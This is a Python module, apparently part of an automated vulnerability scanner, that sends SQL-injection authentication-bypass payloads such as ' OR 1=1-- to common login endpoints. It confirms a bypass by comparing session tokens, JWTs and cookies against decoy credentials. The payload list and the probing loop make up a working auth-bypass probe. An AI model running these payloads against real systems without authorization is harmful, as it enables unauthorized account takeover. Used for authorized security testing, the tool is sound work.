"""Login SQL-injection / auth-bypass probe (vuln phase, non-destructive).

Many auth bypasses live in the login handler, not a query string — and modern
apps take a JSON body and return a JWT, not a redirect+cookie. This probe sends
a benign SQLi payload (`' OR 1=1--`) to common login endpoints (JSON and
form-encoded) and confirms a bypass ONLY when:

  * a bogus-credential baseline does NOT yield a token (so the endpoint isn't
    just handing tokens to everyone), AND
  * the SQLi payload yields a 200 carrying a session token / JWT.

Detection only — the recovered session is never used. Runs in the vuln phase so
it fires without --go (unlike the exploit-phase auth_bypass worker, which needs
a triggering finding).
"""

from __future__ import annotations

import json
import logging
import re
import urllib.parse
from typing import List, Optional
from urllib.parse import urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.login_sqli")

TECHNIQUE = "login_sqli"

# Root-relative login endpoints, REST and classic.
_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/login",
    "/login", "/auth/login", "/user/login", "/account/login", "/signin",
]

# Benign auth-bypass payloads placed in the identity field.
_SQLI_PAYLOADS = ["' OR 1=1--", "' OR '1'='1", "admin' OR '1'='1'--", "' OR 1=1#"]

# A JWT (header.payload.signature with a real base64url payload) signals a live
# session. A token-shaped JSON KEY only matters if its VALUE is a usable opaque
# credential — a bare "token" key carrying a short CSRF nonce, null, "", or a
# validation-error string is NOT a session.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
# Capture the value so we can judge whether it is a real credential, not a nonce.
_TOKEN_KV_RE = re.compile(
    r'"(?:token|authentication|access_token|auth_token|id_token|jwt)"'
    r'\s*:\s*"([^"]*)"',
    re.I,
)
# A Set-Cookie session value (genuine cookie-session bypass) — name carries
# "session"/"auth"/"sid"/"jwt"/"token" and a non-trivial opaque value.
_SESSION_COOKIE_RE = re.compile(
    r'\b([A-Za-z0-9_\-]*(?:session|sess|auth|sid|jwt|token)[A-Za-z0-9_\-]*)'
    r'=([A-Za-z0-9._\-]{16,})',
    re.I,
)
# Any cookie NAME=value (used to harvest the names a server hands every client,
# regardless of status, so an anonymous container session present on the baseline
# is not mistaken for an auth grant on the payload's response).
_COOKIE_NV_RE = re.compile(r'([A-Za-z0-9_\-]+)\s*=\s*([^;,\s]+)')
# Well-known framework container-session cookies. These are minted for ANY
# client (including anonymous ones) to hold a CSRF token / flash attributes, so a
# Set-Cookie carrying one of these names is NOT, on its own, proof of an
# authenticated session — a corroborating signal (body JWT, real auth-token JSON
# value) is required. Compared case-insensitively against the cookie name.
_CONTAINER_SESSION_COOKIES = frozenset({
    "jsessionid", "phpsessid", "asp.net_sessionid", "aspsessionid",
    "connect.sid", "sid", "ci_session", "laravel_session", "_session_id",
    "csrftoken", "csrf_token", "xsrf-token", "x-csrf-token",
})
# HTML markers betraying a form re-render / interstitial rather than a JSON auth
# response — a 200 that is really an HTML page (login form, WAF block page) is
# not an authenticated-session grant even if a long token-shaped string appears
# somewhere in the markup.
_HTML_PAGE_RE = re.compile(r'<(?:html|form|!doctype|head|body|title)\b', re.I)
# A token VALUE must be at least this long to be a plausible session credential
# (filters short anti-CSRF nonces like "a1b2c3d4").
_MIN_TOKEN_LEN = 20
# Validation-error envelopes: a field-level error response is NOT a logged-in
# session even if it carries a retry/CSRF token. Presence of any of these signals
# the SQLi payload was rejected by input validation, not granted a session.
_VALIDATION_ERR_RE = re.compile(
    r'"(?:field|errors?|validation[_-]?(?:failed|error)?|invalid[_-]?(?:characters|email|input))"',
    re.I,
)
# Non-credential token values to reject outright (case-insensitive).
_REJECT_VALUES = {"", "null", "none", "false", "0", "failed", "error", "invalid",
                  "expired", "missing"}


def _origin(url: str) -> str:
    p = urlsplit(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else url.rstrip("/")


async def _post_login(url: str, ident: str, password: str, *, as_json: bool,
                      timeout: float) -> Optional[HttpResp]:
    fields = {"email": ident, "username": ident, "user": ident,
              "password": password, "pass": password, "pwd": password}
    if as_json:
        body = json.dumps({"email": ident, "username": ident,
                           "password": password}).encode()
        ct = "application/json"
    else:
        body = urllib.parse.urlencode(fields).encode()
        ct = "application/x-www-form-urlencoded"
    return await fetch("POST", url, headers={"Content-Type": ct}, body=body,
                       timeout=timeout, follow_redirects=False)


def _is_usable_token_value(val: str) -> bool:
    """True if `val` is a plausible session credential, not a CSRF nonce/error.

    A real JWT (with an eyJ payload) always qualifies; otherwise the value must
    be a long-enough opaque string and not a known sentinel ("", null, failed...).
    """
    v = (val or "").strip()
    if _JWT_RE.search(v):
        return True
    if v.lower() in _REJECT_VALUES:
        return False
    return len(v) >= _MIN_TOKEN_LEN


def _cookie_names(resp: Optional[HttpResp]) -> set:
    """Lowercased NAMEs of every Set-Cookie in `resp`, for ANY status code.

    Used to learn which cookies a server hands every client (anonymous or not).
    A container session id (JSESSIONID/PHPSESSID/...) attached to the bogus
    baseline or control proves it is minted for unauthenticated clients, so an
    identically-named cookie on the payload response is not an auth grant.
    """
    if not resp:
        return set()
    cookie_hdr = (resp.headers or {}).get("set-cookie", "")
    if not cookie_hdr:
        return set()
    return {m.group(1).lower() for m in _COOKIE_NV_RE.finditer(cookie_hdr)}


def _session_signal(resp: Optional[HttpResp],
                    known_cookies: Optional[set] = None) -> Optional[str]:
    """Return a stable identifier for a live session in `resp`, else None.

    A session is proven by ONE of:
      * a JWT anywhere in the body (header.payload.signature), OR
      * a token-shaped JSON key whose VALUE is a usable credential
        (long opaque string, not a short CSRF nonce / null / error string), OR
      * a Set-Cookie session cookie with a non-trivial value — but only if its
        name was NOT already handed to the bogus baseline/control (`known_cookies`)
        and is not a well-known framework container-session cookie (those are
        minted for anonymous clients and need body-level corroboration).

    A field-level validation-error envelope is treated as NO session even if it
    carries a retry token — the SQLi payload was rejected, not authenticated.
    An HTML page (login form re-render / WAF block interstitial) is never an
    authenticated-session grant on its own, so a token-shaped string embedded in
    markup does not qualify.

    The returned string lets the caller do a positive differential: a token that
    ALSO appears for a well-formed-but-wrong control credential is not a bypass.
    """
    if not resp or resp.status != 200:
        return None
    body = resp.body or ""
    known = {c.lower() for c in (known_cookies or set())}
    is_html_page = bool(_HTML_PAGE_RE.search(body))

    # Set-Cookie sessions (genuine cookie-based bypass) — header, not just body.
    # A cookie is an auth signal ONLY if its NAME is new (absent from the bogus
    # baseline/control — those clients are unauthenticated) AND it is not a
    # framework container-session id minted for anonymous clients.
    cookie_hdr = (resp.headers or {}).get("set-cookie", "")
    if cookie_hdr:
        for m in _SESSION_COOKIE_RE.finditer(cookie_hdr):
            name = m.group(1).lower()
            if name in known:
                continue  # server hands this to anonymous clients too
            if name in _CONTAINER_SESSION_COOKIES:
                continue  # anonymous session container, not an auth grant
            if _is_usable_token_value(m.group(2)):
                return "cookie:" + m.group(2)

    if not body:
        return None

    # A bare JWT in the body is a strong, value-bearing signal on its own.
    jm = _JWT_RE.search(body)
    if jm:
        return "jwt:" + jm.group(0)

    # A token KEY only counts if its VALUE is a usable credential AND the
    # response is not a validation-error envelope (which carries retry/CSRF
    # tokens, not sessions) AND the response is not an HTML page (a login-form
    # re-render or WAF block interstitial embeds tokens in markup but grants no
    # session). The non-JWT token path is JSON-only.
    if _VALIDATION_ERR_RE.search(body):
        return None
    if is_html_page:
        return None
    for val in _TOKEN_KV_RE.findall(body):
        if _is_usable_token_value(val):
            return "token:" + val.strip()
    return None


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    origin = _origin(url)
    timeout = min(agent.timeout_s, 8.0)
    findings: list[dict] = []

    for path in _LOGIN_PATHS:
        login_url = origin + path
        for as_json in (True, False):
            # Baseline: a wrong credential (valid-format email, no SQL
            # metacharacters) must NOT return a session, else the endpoint hands
            # sessions to anyone and a session is no SQLi signal.
            baseline = await _post_login(
                login_url, "no_such_user_8f31@example.com", "wrongpass_8f31",
                as_json=as_json, timeout=timeout)
            if baseline is None or baseline.status >= 500:
                continue
            # Harvest the cookie names the server hands an unauthenticated client
            # REGARDLESS of status — a container session id (JSESSIONID/PHPSESSID)
            # on a 401 baseline proves it is an anonymous session, so the same
            # cookie on the payload's 200 is not an auth grant.
            known_cookies = _cookie_names(baseline)
            base_sig = _session_signal(baseline)
            if base_sig is not None:
                continue
            # Well-formed-but-wrong CONTROL: a second valid-format email with NO
            # SQL metacharacters. The malformed-email validation path emits a
            # 200 + retry/CSRF "token"; a real login form does the same here for
            # any rejected credential. If THIS control produces a session signal,
            # the signal comes from the response shape (validation/retry), not
            # from the SQLi payload — so any match below is not a bypass.
            control = await _post_login(
                login_url, "legit-but-wrong@example.com", "AlsoWrong_9c20",
                as_json=as_json, timeout=timeout)
            known_cookies |= _cookie_names(control)
            ctrl_sig = _session_signal(control, known_cookies) if control else None
            if ctrl_sig is not None:
                continue
            for payload in _SQLI_PAYLOADS:
                resp = await _post_login(login_url, payload, "x",
                                         as_json=as_json, timeout=timeout)
                # The payload's session signal must use a cookie NAME absent from
                # both unauthenticated probes (anonymous container ids excluded).
                sig = _session_signal(resp, known_cookies)
                # Positive differential: the SQLi payload must yield a session
                # signal absent from BOTH the bogus baseline and the well-formed
                # control. (base_sig/ctrl_sig are already None here.)
                if sig is not None:
                    findings.append({
                        "type": "auth_bypass_confirmed",
                        "vuln_type": "auth_bypass:sqli_login",
                        "title": f"SQL-injection auth bypass at {path}",
                        "severity": "critical",
                        "url": login_url,
                        "parameter": "email" if as_json else "username",
                        "payload": payload,
                        "cwe": "CWE-89",
                        "confidence": 0.92,
                        "foothold": True,
                        "evidence": (
                            f"{'JSON' if as_json else 'form'} login with "
                            f"{payload!r} returned a 200 carrying a session "
                            "token while a bogus credential did not"
                        ),
                        "poc_request": (
                            f"POST {login_url} "
                            f"({'json' if as_json else 'form'}) email={payload}"
                        ),
                    })
                    return findings  # one confirmed bypass is enough
    return findings


register_worker("vuln", TECHNIQUE, run)
